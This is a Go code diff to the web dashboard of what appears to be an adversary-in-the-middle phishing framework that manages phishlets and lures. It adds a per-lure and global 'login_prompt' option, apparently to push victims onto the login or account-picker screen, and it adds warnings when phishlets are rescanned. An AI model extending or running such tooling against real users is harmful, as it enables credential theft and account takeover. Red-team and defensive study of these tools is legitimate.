@@ -330,6 +330,7 @@ func (ds *DashboardServer) handleSystem(w http.ResponseWriter, r *http.Request) 
 		"autocert":         ds.cfg.IsAutocertEnabled(),
 		"strip_headers":    ds.cfg.IsStripHeadersEnabled(),
 		"force_login":      ds.cfg.IsForceLoginEnabled(),
+		"login_prompt":     ds.cfg.GetLoginPrompt(),
 		"unauth_redirect":  ds.cfg.IsUnauthRedirectEnabled(),
 		"block_vpn":        ds.cfg.GetBlockVPN(),
 		"geoip":            ds.cfg.GetGeoIP() != nil,
@@ -872,29 +873,29 @@ func (ds *DashboardServer) handlePhishletsRefresh(w http.ResponseWriter, r *http
 	ds.opMu.Lock()
 	defer ds.opMu.Unlock()
 	pDir := ds.cfg.GetPhishletsDir()
-	files, err := os.ReadDir(pDir)
+	files, scanWarnings, err := ScanPhishletsDir(pDir)
 	if err != nil {
 		jsonErr(w, 500, "cannot read phishlets directory: "+err.Error())
 		return
 	}
+	for _, w := range scanWarnings {
+		log.Warning("phishlets: %s", w)
+	}
 	added, refreshed := []string{}, []string{}
 	reloadedEnabled := false
 	for _, f := range files {
-		if f.IsDir() {
-			continue
-		}
-		name, ok := PhishletSiteFromFile(f.Name())
-		if !ok {
-			continue
-		}
+		name := f.Site
 		existing, lookupErr := ds.cfg.GetPhishlet(name)
 		if lookupErr == nil && existing.ParentName != "" {
 			continue
 		}
-		newPl, parseErr := NewPhishlet(name, filepath.Join(pDir, f.Name()), nil, ds.cfg)
+		newPl, parseErr := NewPhishlet(name, f.Path, nil, ds.cfg)
 		if parseErr != nil {
-			log.Error("refresh: failed to parse '%s': %v", f.Name(), parseErr)
+			log.Error("refresh: failed to parse '%s': %v", filepath.Base(f.Path), parseErr)
 			continue
+		}
+		for _, w := range newPl.DuplicatePhishSubs() {
+			log.Warning("phishlet '%s': %s", name, w)
 		}
 		if lookupErr != nil {
 			ds.cfg.AddPhishlet(name, newPl)
@@ -1002,6 +1003,7 @@ func (ds *DashboardServer) lureDTO(i int, l *Lure) map[string]interface{} {
 		"active_hours":    l.ActiveHours,
 		"active_days":     l.ActiveDays,
 		"active_tz":       l.ActiveTZ,
+		"login_prompt":    l.LoginPrompt,
 		"og_title":        l.OgTitle,
 		"og_desc":         l.OgDescription,
 		"og_image":        l.OgImageUrl,
@@ -1048,14 +1050,20 @@ func (ds *DashboardServer) handleLureCreate(w http.ResponseWriter, r *http.Reque
 	ds.opMu.Lock()
 	defer ds.opMu.Unlock()
 	var payload struct {
-		Phishlet  string `json:"phishlet"`
-		Subdomain string `json:"subdomain"`
-		Interval  string `json:"interval"`
+		Phishlet    string `json:"phishlet"`
+		Subdomain   string `json:"subdomain"`
+		Interval    string `json:"interval"`
+		LoginPrompt string `json:"login_prompt"`
 	}
 	if err := readJSON(r, &payload); err != nil {
 		jsonErr(w, 400, "invalid body")
 		return
 	}
+	if payload.LoginPrompt != "" && NormalizeLoginPrompt(payload.LoginPrompt) == "" {
+		jsonErr(w, 400, "login_prompt must be off, login or select_account")
+		return
+	}
+	prompt := NormalizeLoginPrompt(payload.LoginPrompt)
 	if _, err := ds.cfg.GetPhishlet(payload.Phishlet); err != nil {
 		jsonErr(w, 404, err.Error())
 		return
@@ -1089,6 +1097,7 @@ func (ds *DashboardServer) handleLureCreate(w http.ResponseWriter, r *http.Reque
 			Path:           "/" + GenRandomString(8),
 			Phishlet:       payload.Phishlet,
 			Hostname:       hostname,
+			LoginPrompt:    prompt,
 			AutoRotate:     true,
 			RotateInterval: int64(d.Seconds()),
 			NextRotate:     now + int64(d.Seconds()),
@@ -1101,7 +1110,7 @@ func (ds *DashboardServer) handleLureCreate(w http.ResponseWriter, r *http.Reque
 		return
 	}
 
-	l := &Lure{Path: "/" + GenRandomString(8), Phishlet: payload.Phishlet, Hostname: hostname}
+	l := &Lure{Path: "/" + GenRandomString(8), Phishlet: payload.Phishlet, Hostname: hostname, LoginPrompt: prompt}
 	ds.cfg.AddLure(payload.Phishlet, l)
 	writeJSON(w, 200, ds.lureDTO(len(ds.cfg.lures)-1, l))
 }
@@ -1173,6 +1182,12 @@ func (ds *DashboardServer) handleLureEdit(w http.ResponseWriter, r *http.Request
 		l.Phishlet = val
 	case "info":
 		l.Info = val
+	case "login_prompt":
+		if val != "" && NormalizeLoginPrompt(val) == "" {
+			jsonErr(w, 400, "login_prompt must be off, login or select_account (or empty to inherit)")
+			return
+		}
+		l.LoginPrompt = NormalizeLoginPrompt(val)
 	case "og_title":
 		l.OgTitle = val
 	case "og_desc":
@@ -1901,6 +1916,7 @@ func (ds *DashboardServer) handleConfigGet(w http.ResponseWriter, r *http.Reques
 			"unauth_redirect":    c.IsUnauthRedirectEnabled(),
 			"strip_headers":      c.IsStripHeadersEnabled(),
 			"force_login":        c.IsForceLoginEnabled(),
+			"login_prompt":       c.GetLoginPrompt(),
 			"block_vpn":          c.GetBlockVPN(),
 			"dashboard_sub":      c.GetDashboardSubdomain(),
 			"dashboard_user":     c.GetDashboardUser(),
@@ -2020,6 +2036,8 @@ func (ds *DashboardServer) applyConfig(key, value string) error {
 		c.SetStripHeaders(parseBool(value))
 	case "force_login":
 		c.SetForceLogin(parseBool(value))
+	case "login_prompt":
+		return c.SetLoginPrompt(value)
 	case "autocert":
 		c.EnableAutocert(parseBool(value))
 		ds.manageCerts(false)
